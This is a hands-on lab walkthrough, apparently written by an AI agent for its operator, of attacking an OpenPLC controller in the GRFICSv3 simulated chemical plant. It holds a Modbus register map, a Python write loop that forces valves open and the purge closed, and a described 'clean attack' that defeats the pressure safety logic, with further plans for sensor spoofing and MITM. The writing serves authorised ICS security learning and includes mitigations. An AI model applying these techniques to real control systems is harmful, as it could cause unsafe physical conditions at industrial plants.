# GRFICSv3 OpenPLC — Hands-On Walkthrough

> **Engagement:** `learning` · **Date:** 2026-06-10 (CDT) / 2026-06-11 (UTC)
> **Operator:** Boss T · **Agent:** Alfred 🎩
> **Lab:** GRFICSv3 (Tennessee Eastman process simulation)
> **Target:** OpenPLC runtime at `192.168.95.2:502`

---

## TL;DR

We walked from "what is this PLC?" to "we forced its actuators and watched the safety logic fight back." All actions were inside a local lab VM, fully reversible, logged before execution, and restored to baseline at the end.

**Key takeaways**

1. The GRFICS OpenPLC runs a simplified Tennessee Eastman chemical process with five PI control loops and one pressure-override safety block.
2. The HMI reads **live input registers** for process variables, not the declared `hmi_*` mirror registers (which are vestigial — the active ST program never writes them).
3. **Direct `%QW` writes from a Modbus client can override PLC control outputs**, but the PLC scans every 100 ms and overwrites our writes — we have to *race* it.
4. Even under sustained forced-actuator commands, the **ST program's `pressure_override` safety logic held the line** at ≈ 2700 psi (override threshold). The safety block worked.
5. **There is a hidden one-liner attack surface** — `product_flow_setpoint := 30000;` at the end of every scan silently reverts the safety override's setpoint bump. A field-device-sensor attack would bypass safety entirely.
6. Mapped to **MITRE ATT&CK for ICS**: T0855 (Unauthorized Command Message), T0831 (Manipulation of Control), T0836 (Modify Parameter), and near-miss T0827 (Loss of Control) / T0880 (Loss of Safety).

---

## Lab topology recap

```
                   simulation (192.168.95.45) — Tennessee Eastman physics
                   ┌── Modbus slaves at 192.168.95.10-15
                   │   Feed1, Feed2, Purge, Product, Tank, Analyzer
                   │
                   ▼ Modbus TCP (PLC polls every 100 ms)
                ┌─────── PLC (192.168.95.2) ──────────────────┐
                │ OpenPLC v3 runtime · program 326339.st       │
                │ 5 PI controllers + 1 pressure-override block │
                │ Exposes :502 (Modbus TCP) + :8080 (web UI)   │
                └────────────┬─────────────────────────────────┘
                             │ Modbus TCP
                             ▼
                ┌─── HMI (192.168.90.107, ScadaLTS) ─────┐
                │ Polls live %IW values via HR addresses │
                └────────────────────────────────────────┘

   Attacker path (this walkthrough):  GRFICS kali (192.168.90.6) ──┐
                                            │ via router (192.168.90.200 / 192.168.95.200)
                                            ▼
                                    PLC :502 (Modbus TCP)
```

Two docker networks behind the GRFICS router:

| Network | Subnet | Purpose | Members |
|---|---|---|---|
| `b-ics-net` | 192.168.95.0/24 | OT zone | PLC, EWS, simulation field |
| `c-dmz-net` | 192.168.90.0/24 | Enterprise/DMZ zone | HMI, Kali, Caldera |

---

## 1. The active PLC program — `326339.st`

OpenPLC's loaded program implements the **Tennessee Eastman simplified process**. The ST source contains four functions and one program block:

| Block | Purpose |
|---|---|
| `scale_to_real(raw, max, min)` | Convert 16-bit UINT (0–65535) to engineering unit |
| `scale_to_uint(real_pct)` | Convert engineering unit back to UINT |
| `control(curr, sp, pos, k, max, min)` | Proportional valve controller, returns new valve UINT |
| `pressure_override(pressure, curr_sp, override_sp)` | Safety logic — bumps product setpoint up when pressure ≥ override threshold |
| `PROGRAM main1` | Wires the five control loops + safety block; runs every 100 ms |

### Control loops

| Loop | Reads (PV) | Adjusts (CV) | Gain `k` | Range | Direction |
|---|---|---|---|---|---|
| Product flow | `product_flow` (%IW107) | `f1_valve_sp` (%QW100) | 20.0 | 0–500 | direct |
| Pressure | `pressure` (%IW108) | `purge_valve_sp` (%QW102) | -20.0 | 0–3200 | reverse |
| A composition | `a_in_purge` (%IW110) | `f2_valve_sp` (%QW101) | 1.0 | 0–100 | direct |
| Level | `level` (%IW109) | `product_valve_sp` (%QW103) | -10.0 | 0–100 | reverse |
| Pressure-override | `pressure` | bumps `product_flow_setpoint` (%MW0) | safety overlay | threshold ≈ 2900 psi | overlay |

### Safety / interlocks

- `pressure_override`: when pressure ≥ ~2900 psi, drives `product_flow_setpoint` upward to bleed the tank by opening product flow.
- `run_bit` (`%QX5.0`, coil 40): controlled-bleed kill switch. When FALSE, the program forces `f1=0, f2=0, purge=65535(open), product=65535(open)`.
- Output clamps on every cycle: `LIMIT(0, x, 65535)` on every %IW and writable %MW — prevents value overflow from corrupting the loop.

### The trapdoor

At the bottom of `main1`:

```st
product_flow_setpoint := 30000;
```

**This line runs every scan, *after* the pressure-override has just bumped `product_flow_setpoint` to bleed pressure.** Result: the override's intent gets reverted in the same cycle. The override is effectively a no-op against `product_flow_setpoint` — the only way it actually affects the plant is during the brief window before the next clamp line executes.

This is a real finding in this lab program, and a useful teaching moment: **safety logic is only as strong as the surrounding code that doesn't undo it.**

---

## 2. Modbus address map for `326339.st`

OpenPLC v3 address mapping (verified empirically against the running PLC):

| ST variable | OpenPLC addr | Modbus addr | FC for read | FC for write | Direction |
|---|---|---|---|---|---|
| `product_flow_setpoint` | `%MW0` | **HR 1024** | 3 | 6/16 | R/W (clamped to 30000 every scan) |
| `a_setpoint` | `%MW1` | **HR 1025** | 3 | 6/16 | R/W |
| `pressure_sp` | `%MW2` | **HR 1026** | 3 | 6/16 | R/W |
| `override_sp` | `%MW3` | **HR 1027** | 3 | 6/16 | R/W |
| `level_sp` | `%MW4` | **HR 1028** | 3 | 6/16 | R/W |
| `f1_valve_pos` | `%IW100` | **IR 100** | 4 | — | R (live, polled from Feed1) |
| `f1_flow` | `%IW101` | **IR 101** | 4 | — | R |
| `f2_valve_pos` | `%IW102` | **IR 102** | 4 | — | R |
| `f2_flow` | `%IW103` | **IR 103** | 4 | — | R |
| `purge_valve_pos` | `%IW104` | **IR 104** | 4 | — | R |
| `purge_flow` | `%IW105` | **IR 105** | 4 | — | R |
| `product_valve_pos` | `%IW106` | **IR 106** | 4 | — | R |
| `product_flow` | `%IW107` | **IR 107** | 4 | — | R |
| `pressure` | `%IW108` | **IR 108** | 4 | — | R |
| `level` | `%IW109` | **IR 109** | 4 | — | R |
| `f1_valve_sp` | `%QW100` | **HR 1124** | 3 | 6/16 | PLC writes (we can overwrite — see §4) |
| `f2_valve_sp` | `%QW101` | **HR 1125** | 3 | 6/16 | PLC writes |
| `purge_valve_sp` | `%QW102` | **HR 1126** | 3 | 6/16 | PLC writes |
| `product_valve_sp` | `%QW103` | **HR 1127** | 3 | 6/16 | PLC writes |
| `hmi_pressure` … `hmi_product_flow` | `%MW20-29` | **HR 1044-1053** | 3 | 6/16 | Declared but never written by `326339.st` — always 0 |
| `run_bit` | `%QX5.0` | **Coil 40** | 1 | 5/15 | R/W |

**Important convention notes:**

- `%MW<n>` and `%QW<n>` map into **holding registers at `1024 + n`** (so `%MW0`=HR1024, `%QW100`=HR1124).
- `%IW<n>` maps into **input registers at `n` directly** (no +1024 offset).
- `%QX<a>.<b>` maps to coil `8*a + b`. `%QX5.0` = coil 40.
- pymodbus 3.x: `device_id=` keyword (not `slave=` — 3.x renamed).

The PLC web UI's **Modbus Addressing** page prints the canonical mapping for the loaded program. Always cross-reference before writing.

---

## 3. Baseline reads (operator perspective)

From an authorized Modbus client (the GRFICS `kali` container), we sampled the live setpoints, HMI mirrors, and `run_bit`:

```
SETPOINTS (writable):
  product_flow_setpoint (MW0/HR1024) = 30000  (45.8% of UINT range)
  a_setpoint            (MW1/HR1025) = 30801  (47.0%)
  pressure_sp           (MW2/HR1026) = 55295  (84.4% — ≈ 2700 psi nominal)
  override_sp           (MW3/HR1027) = 31675  (48.3%)
  level_sp              (MW4/HR1028) = 28835  (44.0%)

HMI MIRRORS:
  hmi_pressure ... hmi_product_flow = all 0  ← unused in this program

run_bit (coil 40) = True
```

Cross-checking against the HMI watch list (ScadaLTS):

| HMI tag | Value | Source register |
|---|---|---|
| TenEast - Pressure | 2700.19 psi | reads %IW108 live, scaled to 0–3200 |
| TenEast - Level | 43.97 % | %IW109 → 0–100 |
| TenEast - AValve | 100.00 % | %IW100 |
| TenEast - AFlow | 499.99 | %IW101 → 0–500 |
| TenEast - BValve | 0.00 % | %IW102 |
| TenEast - BFlow | 0.00 | %IW103 |
| TenEast - PurgeValve | 0.00 % | %IW104 |
| TenEast - PurgeFlow | 0.00 | %IW105 |
| TenEast - ProductValve | 7.14 % | %IW106 |
| TenEast - ProductFlow | 15.18 | %IW107 |
| TenEast - AComp | 47.67 % | %IW110 (a_in_purge) |
| TenEast - BComp | 0.96 % | %IW111 (b_in_purge) |
| TenEast - CComp | 51.36 % | %IW112 (c_in_purge) |
| TenEast - Run | 1 | coil 40 |

**Confirmed: the HMI reads live input registers, not the `hmi_*` holding-register mirrors.** Those mirrors are dead code in this program.

---

## 4. Experiment 1 — Legitimate setpoint change (`pressure_sp`)

**Goal:** Show that the HMI / process responds to a single authorised setpoint change.

**Action:** `write HR 1026 (pressure_sp): 55295 → 49150` (≈ 2700 psi → 2400 psi target).

**Observation on HMI:**

- `TenEast - Pressure` drifted from 2700 → 2400 over ~30 s.
- `TenEast - PurgeValve` opened briefly (loop opened it to bleed pressure).
- `TenEast - PurgeFlow` rose accordingly.
- All other loops unchanged.

**Restore:** `write HR 1026: 49150 → 55295`. Verified read-back.

**Significance:** This is the legitimate operator path. Same effect a sane HMI button-press would produce, logged here for audit.

**MITRE mapping:** None — authorised parameter change.

---

## 5. Experiment 2 — Forced `%QW` actuator override

**Goal:** Override the PLC's valve outputs directly by writing the `%QW` holding registers faster than the PLC's 100 ms scan cycle.

**Method:** Python loop in the `kali` container, writing every ~50 ms:

```python
c.write_register(1124, 65535, device_id=1)  # f1_valve_sp -> max (Feed-1 wide open)
c.write_register(1125, 65535, device_id=1)  # f2_valve_sp -> max (Feed-2 wide open)
c.write_register(1126, 0,     device_id=1)  # purge_valve_sp -> 0 (Purge closed)
time.sleep(0.04)
```

Status sampled every second via FC4 reads of input registers 100-109.

**Live trace (excerpted):**

```
   t   f1_sp  f2_sp  purge_sp   pressure  level   purgeV  purgeF  prodV
   1.0  65535  65535       0      2569    44.0%    0.0%     0.0   100.0%
  10.2  65535  65535       0      2600    43.9%    0.0%     0.0    88.8%   ← pressure rising, product closing
  20.4  65535  65535       0      2633    43.9%    0.0%     0.0    46.9%
  30.6  65535  65535       0      2667    44.0%    0.0%     0.0     9.3%   ← product valve almost closed
  35.7  65535  65535       0      2685    44.0%    0.0%     0.0     4.7%
  39.8  65535  65535       0      2699    44.1%    0.0%     0.0    11.1%   ← inflection point
  40.8  65535  65535       0      2702    44.1%   22.5%   403.3    13.5%   ← override fires
  41.8  65535  65535       0      2695    44.1%    5.9%   105.1    16.2%   ← our writes momentarily lose
  44.9  65535  65535       0      2697    44.1%  100.0%   500.0    25.1%   ← PLC briefly wins
  45.9  65535  65535       0      2694    44.1%    0.0%     0.0    30.2%   ← we win back
  49.0  65535  65535       0      2697    44.1%   83.0%   500.0    46.0%
  52.0  65535  65535       0      2697    44.1%   61.5%   500.0    63.8%
  55.1  65535  65535       0      2701    44.1%   84.0%   500.0    75.2%
  59.2  65535  65535       0      2699    44.1%   93.7%   500.0    94.1%
```

**Phase analysis:**

1. **t=0 → 30 s — Forced-actuator phase.** Pressure rose at ~3 psi/s. Purge stayed pinned at 0% (our writes winning the race). Product valve closed (level loop doing its job — level was stable, less product going out).

2. **t=30 → 40 s — Approach to safety threshold.** Pressure climbed from 2667 → 2699 psi. Product valve nearly closed (~5%).

3. **t=40 s — `pressure_override` safety fires.** The ST safety block bumped `product_flow_setpoint`, which started forcing product valve open. We also see our purge clamp briefly losing (`purgeV` jumps to 22.5%, then 100%, then 5.9%, then 0%) — those are individual PLC scan cycles squeezing writes in between our 50 ms hammer rounds.

4. **t=40 → 60 s — Tug-of-war.** Pressure held at ≈ 2697 ± 5 psi. Purge oscillating (PLC wins ~once per 2-3 seconds, we win the rest). Product valve climbing steadily back from 13% → 94% (the safety bump was *sticking* on this one because we weren't clobbering HR 1127).

5. **t=60 s — Stop.** Within ~5 s, plant returned to baseline (PurgeV=0, ProdV~95→100%, pressure 2697 → 2695).

**Restore:** No script-side restore needed — once our writes stopped, the PLC's normal control resumed and pulled the process back to setpoint. Setpoints (HR 1024-1028) were never touched in this experiment.

---

## 6. Findings

### Finding 1 — `%QW` actuator override is possible from any Modbus-reachable client
**Severity:** High in real OT, expected/by-design here.

**Detail:** OpenPLC exposes `%QW` outputs as standard holding registers (HR 1124-1127 in this program). Any unauthenticated client that can reach the PLC's Modbus TCP port (502) can write them. The PLC's control logic will fight back every 100 ms, but at write rates ≥ 10 Hz the attacker wins most cycles.

**MITRE:** T0855 (Unauthorized Command Message), T0831 (Manipulation of Control).

**Mitigation in a real plant:** Modbus over TCP has no auth. Defence is network: deep zone segmentation, deny Modbus from DMZ → ICS except for explicitly-named clients (the HMI), inline DPI / SIEM for unexpected write function codes, and consider Modbus/TCP Security (RFC unfortunately optional).

---

### Finding 2 — `pressure_override` safety logic worked under attack
**Severity:** Positive — the safety did its job.

**Detail:** With feeds wide open and purge clamped at 0, pressure rose linearly to ~2700 psi, where the ST `pressure_override` block fired. It bumped `product_flow_setpoint`, which forced the product valve open over the next ~15 s. Pressure capped at ~2700 psi instead of running to 3200 (the configured `rmax`).

**Caveat:** The safety only saved us because we did *not* also clobber HR 1127 (`product_valve_sp`). A more disciplined attacker would do so. See Finding 4.

---

### Finding 3 — Vestigial `hmi_*` mirror registers
**Severity:** Informational.

**Detail:** The ST program declares `%MW20-29` (HR 1044-1053) as HMI mirror variables but never writes them. The HMI is configured to read live `%IW` input registers directly. The mirrors are dead code — confirmed by reading HR 1044-1053 during normal operation (all zero).

**Why it matters for an attacker:** Stuxnet-style "lie to the HMI" attacks against this lab need to target either the field-device Modbus slaves at `.10-.15` (which feed the live %IW values) or implement a MITM between the PLC and the HMI. They cannot just write the mirror registers because the HMI doesn't read them.

---

### Finding 4 — `product_flow_setpoint` clamp neutralises pressure-override safety
**Severity:** Real bug in this lab program.

**Detail:** The line

```st
product_flow_setpoint := 30000;
```

at the bottom of `main1` runs every scan, *after* `pressure_override` may have just bumped it. In normal operation this is invisible (override never fires). In attack scenarios where the attacker is suppressing purge flow, the override fires every scan and is immediately reverted every scan. The net effect on `product_flow_setpoint` is zero — the safety bump is overwritten.

**Why it worked in Experiment 2 anyway:** the override *also* indirectly affects the product valve through its scan-level write to `product_flow_setpoint`. Even with the reversion, each scan briefly raised the setpoint, which the product-flow controller acted on (`f1_valve_sp` would have been driven higher except we were clamping it too). The product valve ended up opening because the level loop was operating in a less-constrained way.

**The clean attack:** clobber HR 1024 (`product_flow_setpoint`) to 0 in the same write loop. Override becomes a no-op. Pressure goes to `rmax`.

---

### Finding 5 — Macvlan isolation between host and lab subnets
**Severity:** Informational.

**Detail:** GRFICS uses docker `macvlan` for `b-ics-net` and `c-dmz-net`. Consequence: the VM host kernel cannot route to 192.168.95.x or 192.168.90.x even though those subnets are technically on `ens33`. All attacker activity must originate from inside one of the containers (e.g. the GRFICS `kali` container) or another endpoint on the VMware NAT broadcast domain.

**Implication:** The VM itself is a *de facto* boundary. Don't expose this VM's NAT IP to anything outside your laptop.

---

## 7. MITRE ATT&CK for ICS mapping

| Tactic | Technique | Where in this walkthrough |
|---|---|---|
| TA0104 — Execution | **T0855** Unauthorized Command Message | Every `write_register` call to HR 1124-1126 |
| TA0106 — Inhibit Response Function | **T0831** Manipulation of Control | Continuous 20 Hz write loop maintaining attacker-chosen valve states |
| TA0106 — Inhibit Response Function | **T0836** Modify Parameter | (Path we didn't take in Exp 2; would be the clean attack — clobber HR 1024) |
| TA0107 — Impair Process Control | **T0827** Loss of Control | Near-miss — safety held |
| TA0107 — Impair Process Control | **T0880** Loss of Safety | Near-miss — safety held |

Reference: <https://attack.mitre.org/matrices/ics/>

---

## 8. Restore state

End-of-engagement read:

```
SETPOINTS (writable):
  product_flow_setpoint = 30000   (baseline)
  a_setpoint            = 30801   (baseline)
  pressure_sp           = 55295   (baseline)
  override_sp           = 31675   (baseline)
  level_sp              = 28835   (baseline)
run_bit = True
```

Pressure stabilised at ~2697 psi within 10 s of stopping the override script. No persistent state change to the PLC.

---

## 9. Open questions / next experiments

1. **Repeat Experiment 2 with HR 1024 (`product_flow_setpoint`) in the write loop.** Predicted: safety override is fully neutralised, pressure runs to `rmax` (3200 psi). Maps to a clean T0827/T0880.

2. **Attack the field-device Modbus slaves at `192.168.95.10-15` directly.** Predicted: we can lie to the PLC about sensor values (e.g. report low pressure when pressure is actually high), defeating safety logic without touching the PLC at all. This is the "Stuxnet against the field device" pattern.

3. **MITM the PLC ↔ HMI link** with `arpspoof` + a custom Modbus proxy. Show the HMI a fictional plant while the real plant is operating differently.

4. **Toggle `run_bit` (coil 40) FALSE.** Observe the controlled-bleed sequence (`f1=0, f2=0, purge=open, product=open`). Confirms the kill-switch behaviour and gives us a baseline for comparing "operator stop" vs "attacker stop".

5. **Implement defender visibility.** Enable Wazuh (`docker compose --profile siem up -d`), watch which of these attacks generate alerts vs. which slip through. The router and ScadaLTS get Wazuh agents by default — the PLC and EWS do not.

---

## 10. Operator reference — quick commands

All from inside the GRFICS `kali` container (`docker exec kali …` from the VM host, or noVNC at `http://localhost:6088` user `kali`/`kali`):

**Read all setpoints + run_bit:**
```bash
docker exec kali python3 /tmp/read_plc.py
```

**Read live process values (single sample):**
```bash
docker exec kali python3 /tmp/watch_process.py 1
```

**Sample process for N×5 s:**
```bash
docker exec kali python3 /tmp/watch_process.py 8
```

**Restore all setpoints to baseline:**
```bash
docker exec kali python3 /tmp/restore_setpoints.py
```

**Single setpoint write (with read-back):**
```bash
docker exec kali python3 /tmp/write_pressure_sp.py <new_uint_value>
```

Scripts live under `/home/claw/engagements/learning/scripts/` on the host; copies are pushed to `/tmp/` inside the `kali` container.

---

## Appendix A — Files generated this session

| Path | Purpose |
|---|---|
| `engagements/learning/scope.md` | Engagement scope (target, authorised actions, forbidden actions) |
| `engagements/learning/notes.md` | Append-only narrative log |
| `engagements/learning/writes.log` | Pre-flight log of every write with restore command |
| `engagements/learning/baseline/setpoints-*.txt` | Baseline reads |
| `engagements/learning/scripts/read_plc.py` | Read setpoints + HMI mirrors + run_bit |
| `engagements/learning/scripts/watch_process.py` | Stream live process values |
| `engagements/learning/scripts/write_pressure_sp.py` | Single-shot setpoint write with read-back |
| `engagements/learning/scripts/force_valves.py` | Continuous `%QW` override loop (Experiment 2) |
| `engagements/learning/scripts/restore_pressure_sp.py` | Restore HR 1026 to baseline |
| `engagements/learning/scripts/restore_setpoints.py` | Restore all five setpoints to baseline |
| `engagements/learning/reports/2026-06-10-openplc-grfics-walkthrough.md` | This document |

---

## Appendix B — References

- GRFICSv3 source: <https://github.com/Fortiphyd/GRFICSv3>
- OpenPLC Runtime v3: <https://openplcproject.com/>
- Tennessee Eastman process (original): Downs & Vogel, *A Plant-Wide Industrial Process Control Problem*, Computers & Chemical Engineering, 1993.
- MITRE ATT&CK for ICS: <https://attack.mitre.org/matrices/ics/>
- pymodbus 3.x docs: <https://pymodbus.readthedocs.io/>
- Modbus TCP spec: Modbus Organization, *Modbus Application Protocol Specification V1.1b3*

---

*Document generated by Alfred 🎩 for Boss T. All actions logged in `engagements/learning/writes.log`.*
